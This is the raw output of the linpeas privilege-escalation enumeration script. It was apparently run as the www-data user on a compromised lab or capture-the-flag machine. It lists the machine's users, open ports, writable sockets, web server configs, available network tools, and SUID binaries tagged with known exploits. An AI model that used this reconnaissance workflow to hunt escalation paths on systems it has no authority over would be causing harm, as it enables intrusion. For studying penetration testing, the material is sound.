drwxr-xr-x  2 root root 4096 Apr 17  2020 .
drwxr-xr-x 90 root root 4096 Jan 26 17:57 ..
-rw-r--r--  1 root root  102 Jun 11  2015 .placeholder
-rwxr-xr-x  1 root root  771 Dec 31  2014 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT       LAST                         PASSED   UNIT                         ACTIVATES
Thu 2023-01-26 18:39:00 CST  21min left Thu 2023-01-26 18:09:01 CST  8min ago phpsessionclean.timer        phpsessionclean.service
Fri 2023-01-27 18:11:57 CST  23h left   Thu 2023-01-26 18:11:57 CST  5min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a        n/a                          n/a      systemd-readahead-done.timer systemd-readahead-done.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/dbus.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/containerd-shim/moby/1da62c6e70c5a40a858b19534075c74726626c9f35195ac26923b1cde4ebd826/shim.sock
/containerd-shim/moby/df43dc369c140d1c4cb8ca1bfb71f6dd7092d8fc32fff32fa2fe0b969876ffd1/shim.sock
/containerd-shim/moby/ef64b5e754cddbc138fda284da0108f513a116a4ccfc32016a376a2328dc5527/shim.sock
/run/acpid.socket
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/docker.sock
/run/docker/libnetwork/c3dd9ded04861ee6a17545b0ab85c32b36668f37676d36400b758f0c57ab7c9c.sock
/run/php/php7.2-fpm.sock
  └─(Read Write)
/run/rpcbind.sock
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/shutdownd
/run/udev/control
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/docker.sock
/var/run/docker/containerd/docker-containerd-debug.sock
/var/run/docker/containerd/docker-containerd.sock
/var/run/docker/metrics.sock

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    CONNECTION-NAME    
:1.0                                   1 systemd         root             :1.0          -                         -          -                  
:1.1                                 438 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
:1.12                               7208 busctl          www-data         :1.12         php7.2-fpm.service        -          -                  
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
org.freedesktop.DBus                   - -               -                -             -                         -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               438 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
org.freedesktop.machine1               - -               -                (activatable) -                         -         
org.freedesktop.systemd1               1 systemd         root             :1.0          -                         -          -                  
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════
                                        ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
Durius
127.0.0.1	localhost
127.0.1.1	Durius

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
domain eu-west-1.compute.internal
search eu-west-1.compute.internal
nameserver 10.0.0.2

╔══════════╣ Interfaces
default		0.0.0.0
loopback	127.0.0.0
link-local	169.254.0.0

br-d93f1fb84d0b Link encap:Ethernet  HWaddr 02:42:e7:7b:e5:6b  
          inet addr:192.168.150.1  Bcast:192.168.150.255  Mask:255.255.255.0
          inet6 addr: fe80::42:e7ff:fe7b:e56b/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2164 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2192 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:3411925 (3.2 MiB)  TX bytes:2714034 (2.5 MiB)

docker0   Link encap:Ethernet  HWaddr 02:42:7b:32:77:19  
          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

eth0      Link encap:Ethernet  HWaddr 02:87:43:db:9b:ed  
          inet addr:10.10.214.203  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::87:43ff:fedb:9bed/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:3356 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3044 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:2064834 (1.9 MiB)  TX bytes:3518324 (3.3 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

veth0e49797 Link encap:Ethernet  HWaddr ba:6f:3d:b1:d7:c2  
          inet6 addr: fe80::b86f:3dff:feb1:d7c2/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2179 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2224 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:3443395 (3.2 MiB)  TX bytes:2716801 (2.5 MiB)

veth42f1130 Link encap:Ethernet  HWaddr 3a:ce:5b:9b:68:b6  
          inet6 addr: fe80::38ce:5bff:fe9b:68b6/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:26 errors:0 dropped:0 overruns:0 frame:0
          TX packets:37 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:2217 (2.1 KiB)  TX bytes:2592 (2.5 KiB)

veth6cd6483 Link encap:Ethernet  HWaddr 4a:50:db:ac:c6:49  
          inet6 addr: fe80::4850:dbff:feac:c649/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:14 errors:0 dropped:0 overruns:0 frame:0
          TX packets:15 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:996 (996.0 B)  TX bytes:1030 (1.0 KiB)


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      731/nginx: worker p
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:35458           0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::111                  :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:25                  :::*                    LISTEN      -               
tcp6       0      0 :::60060                :::*                    LISTEN      -               

╔══════════╣ Can I sniff with tcpdump?
No



                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=33(www-data) gid=33(www-data) groups=33(www-data)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is disabled (0)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
benclower:x:1001:1001:Ben Clower,,,:/home/benclower:/bin/bash
me:x:1000:1000:me,,,:/home/me:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=103(systemd-timesync) groups=103(systemd-timesync)
uid=1000(me) gid=1000(me) groups=1000(me),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
uid=1001(benclower) gid=1001(bendover) groups=1001(bendover)
uid=101(systemd-network) gid=104(systemd-network) groups=104(systemd-network)
uid=102(systemd-resolve) gid=105(systemd-resolve) groups=105(systemd-resolve)
uid=103(systemd-bus-proxy) gid=106(systemd-bus-proxy) groups=106(systemd-bus-proxy)
uid=104(Debian-exim) gid=109(Debian-exim) groups=109(Debian-exim)
uid=105(statd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=112(messagebus) groups=112(messagebus)
uid=107(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 18:17:12 up 20 min,  0 users,  load average: 0.39, 0.12, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Wed Apr 22 06:31:00 2020 - Wed Apr 22 06:39:48 2020  (00:08)     0.0.0.0
root     tty1         Fri Apr 17 09:52:30 2020 - down                      (00:11)     0.0.0.0
reboot   system boot  Fri Apr 17 09:51:59 2020 - Fri Apr 17 10:03:44 2020  (00:11)     0.0.0.0
root     tty1         Fri Apr 17 09:51:27 2020 - down                      (00:00)     0.0.0.0
reboot   system boot  Fri Apr 17 09:50:45 2020 - Fri Apr 17 09:51:49 2020  (00:01)     0.0.0.0
me       pts/0        Fri Apr 17 09:19:36 2020 - down                      (00:30)     192.168.225.1
root     tty1         Fri Apr 17 09:18:53 2020 - down                      (00:31)     0.0.0.0
reboot   system boot  Fri Apr 17 09:18:36 2020 - Fri Apr 17 09:50:33 2020  (00:31)     0.0.0.0

wtmp begins Fri Apr 17 09:18:36 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             tty1                      Thu Apr 23 15:44:19 -0500 2020
me               pts/0    192.168.66.1     Thu Apr 23 15:46:36 -0500 2020

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                                       ╔══════════════════════╗
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════
                                       ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/docker
/bin/nc
/bin/nc.traditional
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/wget

╔══════════╣ Installed Compilers
/usr/share/gcc-4.9


╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.10 (Debian)
Server built:   Sep 30 2019 19:32:08
httpd Not Found

Nginx version: 
./linpeas.sh: 2593: ./linpeas.sh: grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null: not found
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Apr 22  2020 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Apr 22  2020 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Apr 22  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

drwxr-xr-x 2 root root 4096 Apr 22  2020 /etc/nginx/sites-enabled
drwxr-xr-x 2 root root 4096 Apr 22  2020 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 34 Apr 17  2020 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
server {
       listen       80;
       location / {
           proxy_no_cache 1;
           proxy_cache_bypass 1;
           add_header Last-Modified $date_gmt;
           add_header Cache-Control 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0';
           if_modified_since off;
           expires off;
           etag off;
           proxy_set_header Host $host;
           proxy_set_header X-Forwarded-For $remote_addr;
           proxy_set_header X-Real-IP $remote_addr;
           proxy_pass http://192.168.150.10:80;
       }
}
lrwxrwxrwx 1 root root 33 Apr 22  2020 /etc/nginx/sites-enabled/newcms -> /etc/nginx/sites-available/newcms
server {
       listen       192.168.150.1:80;
       server_name  newcms.mofo.pwn;
       root /var/www/html/;
       index  index.php index.html index.htm;
       client_max_body_size 100M;
       autoindex off;
       location / {
	try_files $uri $uri/ @handler;        
       }
       location  /admin {
        try_files $uri $uri/ /admin/index.php?$args;
        }
    
        location @handler {
        if (!-e $request_filename) { rewrite / /index.php last; }
        rewrite ^(.*.php)/ $1 last;
        }
         location ~ \.php$ {
         include snippets/fastcgi-php.conf;
         fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
         fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
         include fastcgi_params;
     }
}


-rw-r--r-- 1 root root 1332 Sep 30  2019 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Apr 22  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 71817 Apr 19  2020 /etc/php/7.2/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71429 Apr 19  2020 /etc/php/7.2/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71819 Apr 22  2020 /etc/php/7.2/fpm/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On

╔══════════╣ Analyzing FastCGI Files (limit 70)
-rw-r--r-- 1 root root 964 Jul 12  2017 /etc/nginx/fastcgi_params

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Dec 10  2017 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Apr 17  2020 /etc/ldap


╔══════════╣ Searching ssl/ssh files
Port 22
PermitRootLogin without-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
gpg-connect-agent: can't connect to the agent: IPC connect call failed
══╣ Some home ssh config file was found
/usr/share/doc/openssh-client/examples/sshd_config
AuthorizedKeysFile	.ssh/authorized_keys
UsePrivilegeSeparation sandbox		# Default for new installations.
Subsystem	sftp	/usr/libexec/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr 17  2020 /etc/pam.d
-rw-r--r-- 1 root root 2133 Mar 25  2019 /etc/pam.d/sshd




╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr 17  2020 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 4545 Apr 22  2020 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 5138 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-jessie-automatic.gpg
-rw-r--r-- 1 root root 5147 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-jessie-security-automatic.gpg
-rw-r--r-- 1 root root 2775 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-jessie-stable.gpg
-rw-r--r-- 1 root root 7483 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7492 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2275 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg
-rw-r--r-- 1 root root 3780 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-wheezy-automatic.gpg
-rw-r--r-- 1 root root 2851 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-wheezy-stable.gpg
-rw-r--r-- 1 root root 364 Apr 22  2020 /etc/apt/trusted.gpg.d/ondrej-php.gpg
-rw-r--r-- 1 root root 36941 Jun 18  2017 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r-- 1 root root 17538 Jun 18  2017 /usr/share/keyrings/debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1652 Jul  6  2019 /var/lib/apt/lists/ftp.no.debian.org_debian_dists_jessie_Release.gpg
-----BEGIN PGP SIGNATURE-----
iQIzBAABCAAdFiEEEmwNJL2KKULMffisdjjQRCuQ0BAFAl0ga7cACgkQdjjQRCuQ
0BA6SQ//XcX8Ht+5nd5TQi468rLb26Gn5VD2iZOcnQmZksR7ny06o0Q+CHoQQqvW
fdRnhH5zVdj1ivcnhQ8ihgCNQILWFcgUgKSlbcSdYvzlJnj6adVboXLkm+Sslght
B/oEI8DLuMA8EhENbyjJ2/0vcTwuj4xaZAAO/Tri+NX55+xt7SbV8u4rfGPgOLlq
7Y54kldHLHM+cFVLTVA2IwfjaNGwoOWkenygH1vroxBiUf0h1CaLDNq4yPo4TSDK
Z24Eb8NWAyjnNdrQ9J0D2qJXXhjfnVXkeUeAIr+LAcmECAo4EnNrDQYt1jsL5An7
VWdTQw6E21jWzgMAqB6IqjsG1R/rlqoE8YtDnl2XiQdvJrhxQ/AR5zLh8fPuirea
2pgsH65DSTTob6Ie6tdWmDTEarRHSMu87a9oaNdBDLecESbXtRqG8ULtI/O3Ygxi
UrjdAsk+eQ0vfCDcWOL4l83yFVIFY/lwmeySriN1rrCFuyl+1QrGtPyFst3zoN0q
nyTdO6MdHU909fKozfYvEoke9G0DCI1N0xiqupO7Csm4yMaUPIdqpe5H67AggD4d
dqY76jk9coCNsAqy5zoi1xSoXDaTl8XjQlmVj7Tx+f2hNTw+16dm0j8Mppt49gw7
Qp8yEkO/nz5+iefSeZpMd4wYmwek3/C0hN4cBfETKVB+63rfAcs=
=37TE
-----END PGP SIGNATURE-----
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAABAgAGBQJdIG1VAAoJEMv41v1RjhfhpkEQAJH/1MMBBRqroekA3xcegY3n
DHTcTWzDD1ioYhVGBp7tu1y1fLkGUcHOUxb05py4oTN16QsNBNzHJRrw6YMYqEB3
dOsJ3tkgnXb4+Jd7r95Pt1o6pso8w4yHICpTUTCCwrkSNUxdFeeuuqGDONl36XK/
saGc/AzfuN0d/xhYzAode7wCc/iBhffZ01JZiwXD+DBuvZCVYn1HHdU78iCOcAgd
DG65m0Y1iQGdDXUuvSkznGFxpMmPhOjHod9+9ZdUx0BbdAX6PblHGtHSgAUQkAEd
5wMERA8X1w2j8nUivAYQ/IzI6lhlfl7c0sg0rF8z6mwxyiEL2gRzNgLnwekn7PEk
Ef+lMnVFIzMnSZUgBhvSgP2V5WNLPavPxtaXxlBchbfEDqNOHBu3qeezVsK+ne4B
BZTlbO9XzMveQjRWNADb8rzzF8QIYcjP1v2JPB/gJIK7HPRAzKs/tvyDXUe8hYdA
Sjs1BKk73/W6DlrOCJRwl/+NvoaN/pfDjf6T/ftI1P2eZuDDH6BOX6HhPHd+Puvb
tkasi14UCs7gjJu9PI5bM5tGUIeykuUQHuHoscIo0HKkgSaurihNuLB89jbMb9uX
EvkrLDeZxgxfbc/sHfbBqKzXK+GatEB+qA3OQKm0np4G1DI3Jr++g0jttaAgwzE7
9njHtrdklIBMMG34aHKf
=KdZN
-----END PGP SIGNATURE-----


╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
lrwxrwxrwx 1 root root 33 Apr 17  2020 /etc/systemd/system/sockets.target.wants/docker.socket -> /lib/systemd/system/docker.socket
-rw-r--r-- 1 root root 0 Apr 17  2020 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket


╔══════════╣ Analyzing FTP Files (limit 70)


-rw-r--r-- 1 root root 69 Apr 19  2020 /etc/php/7.2/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Apr 19  2020 /usr/share/php7.2-common/common/ftp.ini






╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r----- 1 www-data adm 721376 Jan 26 18:14 /var/log/nginx/access.log

-rw-r----- 1 www-data adm 16106 Jan 26 18:14 /var/log/nginx/error.log

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3515 Nov  5  2016 /etc/skel/.bashrc





-rw-r--r-- 1 root root 675 Nov  5  2016 /etc/skel/.profile






                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-- 1 root messagebus 292K Jun 14  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 9.9K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 455K Mar 25  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 1012K Sep  5  2019 /usr/sbin/exim4
-rwsr-xr-x 1 root root 53K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 74K May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 53K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-sr-x 1 daemon daemon 55K Sep 30  2014 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-sr-x 1 root mail 88K Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 44K May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 39K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 89K Oct 19  2019 /sbin/mount.nfs
-rwsr-xr-x 1 root root 27K Mar 29  2015 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 40K May 17  2017 /bin/su
-rwsr-xr-x 1 root root 40K Mar 29  2015 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 61K May 17  2017 /usr/bin/chage
-rwxr-sr-x 1 root ssh 339K Mar 25  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root mail 11K Aug  1  2018 /usr/bin/mutt_dotlock
-rwxr-sr-x 1 root mail 19K Nov 18  2017 /usr/bin/lockfile
-rwxr-sr-x 1 root mlocate 35K Jun 13  2013 /usr/bin/mlocate
-rwxr-sr-x 1 root tty 15K Oct 17  2014 /usr/bin/bsd-write
-rwsr-sr-x 1 daemon daemon 55K Sep 30  2014 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-sr-x 1 root mail 88K Nov 18  2017 /usr/bin/procmail
-rwxr-sr-x 1 root shadow 23K May 17  2017 /usr/bin/expiry
-rwxr-sr-x 1 root mail 15K Jun  2  2013 /usr/bin/dotlockfile
-rwxr-sr-x 1 root tty 27K Mar 29  2015 /usr/bin/wall
-rwxr-sr-x 1 root crontab 36K Mar 21  2019 /usr/bin/crontab
-rwxr-sr-x 1 root adm 88K Dec 12  2012 /usr/bin/ispell
-rwxr-sr-x 1 root shadow 35K May 27  2017 /sbin/unix_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff

Shell capabilities:
0x0000000000000000=
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
